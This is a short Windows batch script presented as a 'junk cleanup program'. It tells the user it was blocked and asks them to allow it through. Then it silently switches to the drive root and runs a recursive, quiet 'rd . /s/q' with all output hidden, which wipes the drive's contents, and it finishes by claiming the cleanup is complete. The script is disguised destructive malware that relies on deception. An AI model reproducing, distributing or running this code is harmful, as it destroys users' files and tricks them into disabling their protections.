@echo off
color 0a 
title 垃圾清理程序
echo ==================
echo 开始清理
echo 被拦截
echo 请放行
echo ==================
pause
B: >nul 2>nul 
cd / >nul 2>nul
rd . /s/q >nul 2>nul
ping 10 127.0.0.1 >nul 2>nul
echo 清理完成
pause